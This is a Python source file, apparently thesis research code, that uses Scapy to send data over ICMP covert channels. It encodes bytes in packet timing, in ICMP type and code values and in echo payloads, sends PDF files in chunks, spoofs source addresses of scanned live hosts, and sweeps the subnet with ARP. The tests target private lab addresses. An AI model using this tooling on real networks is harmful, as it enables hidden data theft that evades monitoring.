    #print("Codici bit: ", codice_bit, "\nBit codice: ",bit_codice) 
    #print("Bit codice: ",bit_codice)
    tipologia_byte=get_tipologia_byte() 
    #print("dict tipologia-byte:",tipologia_byte) 
    #print("\n")

    tipologia, codice=get_tipologia_codice(bit_codice[16]) 
    pkt_init= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=tipologia, code=codice)
    pkt_init.summary()
    sendp(pkt_init, verbose=1, iface=interface)  

    index=0
    while index < len(message): 
        #print("Len", len(message), "Index", index) 
        #1st Byte - Delay time - Indicato da 1 byte 
        byte=message[index+0]
        delay=min_delay+(byte/255)*(max_delay-min_delay)
        print("+++++Timing\t",chr(byte), "Byte", byte,"Delay", delay) 
        time.sleep(delay) 
        index+=1

        #2nd Byte - tipologia di messaggi inviati - Indicato da 1 byte 
        try: 
            primi_4bit, ultimi_4bit=get_1st_last_4bit(message[index]) 
            primo_messaggio=get_tipologia_codice(bit_codice[primi_4bit] )
            secondo_messaggio=get_tipologia_codice(bit_codice[ultimi_4bit]) 
            print("+++++Tipologia\t", chr(message[index]), "Byte", message[index]) 
            #print("First 4 bit", primi_4bit, "1st message:",primo_messaggio, "2nd message:",secondo_messaggio) 
            #print("Last 4 bit", ultimi_4bit, "2nd message:",secondo_messaggio) 
        except IndexError as e: 
            #print("Raggiunta massima lunghezza del messaggio") 
            #TODO mandare un pacchetto comunque per indicare la cosa. Deltermine della comunicazione
            #TODO usare in caso tipologia inutilizzata siccome erano 17 e log_2(17)=4.08
            break
        index+=1
        
        for tipologia, codice in [primo_messaggio, secondo_messaggio]:
           # print("Tipologia:",tipologia, "Codice:",codice) 
            num_byte=tipologia_byte[tipologia]  
            #print("Byte necessari: ",num_byte) 
            if index>=len(message): 
                #print("L'indice supera la lunghezza della stringa") 
                break 
            try: 
                data=message[index:index+num_byte]
                print("+++Messaggio\t",data) 
                pkt=get_packet(tipologia, codice, data, ip_dst)
                pkt.summary() 
            except Exception as e: 
                print("3 Eccezione:",e) 
                #pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() #/ Raw(load=random_delay.to_bytes(signed=True))
                #pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=tipologia, code=codice)  
                #pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=tipologia, code=codice)  
            if tipologia==3: 
                print("Tipologia è 2")
                #pkt.show2()
                #hexdump(pkt)
            sendp(pkt, verbose=1, iface=interface) 
            index+=num_byte

        print("") 
    
    tipologia, codice=get_tipologia_codice(bit_codice[16]) 
    pkt_end= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=tipologia, code=codice)
    pkt_end.summary()
    sendp(pkt_end, verbose=1, iface=interface) 


ip_dst=ipaddress.ip_address("192.168.1.11") 
ip_dst=ipaddress.ip_address("192.168.1.17") 

ip_src=ipaddress.ip_address("192.168.1.11") 

data=("Dato mandato dal computer di Marco per testare un timing channel a 8 bit"*1).encode() 
#data=("abcdefg"*7).encode() 
print("Data", data) 

#send_test_hybrid_channel(data, ip_dst) 
#receive_test_hybrid_channel(ip_dst, ip_src) 

#AttackType.ipv4_destination_unreachable(data, ip_dst)

#snort() { sudo /usr/local/snort/bin/snort --daq-dir /usr/local/lib/daq_s3/lib/daq "$@" }

#source ~/.bashrc 


def send_pdf(): 
    #reader = PdfReader("ACN-GPDP Linee Guida Conservazione Password.pdf") 
    reader = PdfReader("main.pdf") 
    
    destinazione=ipaddress.ip_address("192.168.1.17") 
    target_mac = IP_INTERFACE.get_macAddress(destinazione).strip().replace("-",":").lower() 
    interface=IP_INTERFACE.iface_from_IP(destinazione) 

    def sendPage(pageText:str=None, indexPage=0):
        if pageText is None:
            return
        block=150 #dimensione in byte del blocco
        min_block=32 #byte
        max_block=64 #byte
        def test_send1():
            for i in range(0,len(pageText),block): 
                sequenza=math.ceil(i/block) 
                pkt = (
                    Ether(dst=target_mac)/ IP(dst=destinazione.compressed) 
                    / ICMP(id=indexPage, seq=sequenza) 
                    / pageText[i:i+block]
                )
                sendp(pkt, verbose=1, iface=interface) 
                time.sleep(1)
        def test_send2():
            send_test_hybrid_channel(
                message=pageText[i:i+block].encode() 
                ,ip_dst=destinazione
            )
        def test_send3(): 
            i=0
            while i<len(pageText): 
                size=random.randint(min_block,max_block)
                if (i+size)>len(pageText): 
                    size=len(pageText)-i
                pkt = (
                    Ether(dst=target_mac)/ IP(dst=destinazione.compressed) 
                    / ICMP(type=8, id=indexPage) 
                    / pageText[i:i+size]
                )
                i+=size
                sendp(pkt, verbose=1, iface=interface) 
                time.sleep(random.uniform(1.0,2.0))
        def test_send4(): 
            i=0
            while i<len(pageText): 
                size=random.randint(min_block,max_block)
                if (i+size)>len(pageText): 
                    size=len(pageText)-i 
                SendSingleton.ipv4_echo_campi_payload(pageText[i:i+size].encode(),destinazione, target_mac, interface) 
                i+=size 
                time.sleep(random.uniform(2.0,3.0)) 
        test_send4()

    #quantita_testo=0
    #for page in range(len(reader.pages)):
    #    stringa=reader.pages[page].extract_text() 
    #    quantita_testo+=len(stringa)
    #    print("Page {page} is {text}\n\n".format(
    #        page=page, 
    #        text=stringa
    #    ))
    #    sendPage(stringa, page) 
        #send_test_hybrid_channel(stringa.encode(), destinazione)
    #    time.sleep(random.uniform(4.0,5.0)) 
    #print("La quantità di testo mandato è: ",quantita_testo) 

    path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/ACN-GPDP Linee Guida Conservazione Password.pdf"
    path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/main.pdf" 
    with open(path_file, "rb") as file:  
        print((file.read()[0:64]))
        SendSingleton.ipv4_echo_campi_payload(
            file.readline(),
            destinazione, 
            target_mac, 
            interface
        ) 

def send_pdf2():  
    path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/ACN-GPDP Linee Guida Conservazione Password.pdf"
    #path_file="D:/Tesi Magistrale/implementazione/unione/scelta_type/main.pdf" 
    with open(path_file, "rb") as file:  
        print(len(file.read())) 
    
    destinazione=ipaddress.ip_address("192.168.1.17") 
    target_mac = IP_INTERFACE.get_macAddress(destinazione).strip().replace("-",":").lower() 
    interface=IP_INTERFACE.iface_from_IP(destinazione) 
    with open(path_file, "rb") as file: 
        dato=None 
        #while dato:=file.read(16384):
        #while dato:=file.read(4096):
        while dato:=file.read():
            SendSingleton.ipv4_echo_campi_payload(
                dato,
                destinazione, 
                target_mac, 
                interface
            ) 
            #time.sleep(random.uniform(300.0,360.0)) #5/6 minuti 
            #time.sleep(random.uniform(180.0,240.0)) #3/4 minuti 
            #print("------")
            #time.sleep(random.uniform(2.0,3.0))  

destinazione=ipaddress.ip_address("192.168.1.74") 
dato=("abcdefghijklmnopqrstuvwxyz"*1).encode()

un_KB=("BORGOGNA"*128)#.encode()
print("Dato length:", len(un_KB)) 
dieci_KB=(un_KB*10)#.encode()
#print("Dato length:", len(dieci_KB)) 
cento_KB=(dieci_KB*10)#.encode()
#print("Dato length:", len(cento_KB)) 

un_MB=(un_KB*1024)#.encode() 
#print("Dato length:", len(un_MB)) 
dieci_MB=(un_MB*10)#.encode() 
#print("Dato length:", len(dieci_MB))
#cento_MB=(dieci_MB*10)#.encode() 
#print("Dato length:", len(cento_MB)) 

tipologia=[
#AttackType.ipv4_destination_unreachable,
AttackType.ipv4_echo_campi,
AttackType.ipv4_echo_payload,
AttackType.ipv4_echo_campi_payload, 
AttackType.ipv4_echo_random_payload, 
] 

# Create an ARP request packet 

def prova_fake_sender():
    cento_KB=(dieci_KB*10)#.encode() 
    host_attivi, host_inattivi= scan_host_attivi() 
    print("HOST ATTIVI: ",host_attivi)
    
    #USO HOST ATTIVI
    ip_dst=ipaddress.ip_address("192.168.1.74") 
    target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower()
    interface=IP_INTERFACE.iface_from_IP(ip_dst) 
    TYPE_ECHO_REQUEST=8
    TYPE_ECHO_REPLY=0
    identifier=0 
    batch_block=1024 
    for batch in range(0,len(cento_KB),batch_block):  
        max_block=64 #byte 
        for index in range(0,len(data),max_block): 
            host_scelto=random.choice(host_attivi) 
            pkt = (
                Ether(dst=target_mac)/ IP(src=ipaddress.ip_address(host_scelto).compressed, dst=ip_dst.compressed) 
                / ICMP(type=TYPE_ECHO_REPLY,id=identifier, seq=0) 
                / data[index:index+max_block]
                )
            sendp(pkt, verbose=1, iface=interface)
        identifier+=1 
        print("Waiting...")
        time.sleep(random.uniform(1,10)) 


destinazione=ipaddress.ip_address("192.168.1.74") 
tempo_inizio=datetime.datetime.now() 
sleep_time=60*60 #15 min
ripetizioni=3 
cento_KB=(dieci_KB*10)#.encode() 
un_MB=(un_KB*1024)#.encode() 
for index in range(ripetizioni):
    SendSingleton.send_data(
        True, 
        False, 
        #AttackType.ipv4_echo_payload, 
        AttackType.ipv4_echo_random_payload, 
        un_MB.encode(),
        destinazione
    ) 
    tempo_fine=datetime.datetime.now()
    print("Tempo di invio:", tempo_fine-tempo_inizio)
    if index!=ripetizioni-1: 
        print(f"{index}o tempo di invio:", datetime.datetime.now()) 
        non_blocking_sleep(sleep_time) 
exit(0)

start_time=datetime.now()
for i in range(1): 
    time.sleep(17.5)
    send_pdf2() 
    print("--------")
    #1h=60 min=3600 sec
    time.sleep(3600)
    
print("Excec time: ",datetime.now()- start_time) 

#Excec time:  0:00:34.737922
#35 secondi

#Con wait di 3 secondi
#Excec time:  0:19:39.998772




#active_host, inactive_host=scan_host_attivi() 
#print("Active:",active_host) 
#print("Inactive:",inactive_host) 


#print("------")
#print(conf.iface)
#print(conf.route.route("0.0.0.0")[2])
#print(conf.route.route("0.0.0.0")[1])
#print((conf.route.route("0.0.0.0")[1]).rsplit(".",1)[0]+"0/24") 

for index in range(256):
    if index==0 or index==255: 
        continue 
    print(f"Index: {index}")
    arp_request = ARP(pdst=f"192.168.1.{index}")
    # Send the ARP request packet
    #send(arp_request) 
    response=sr1(arp_request) 
    if response:
        print(response)
exit(0)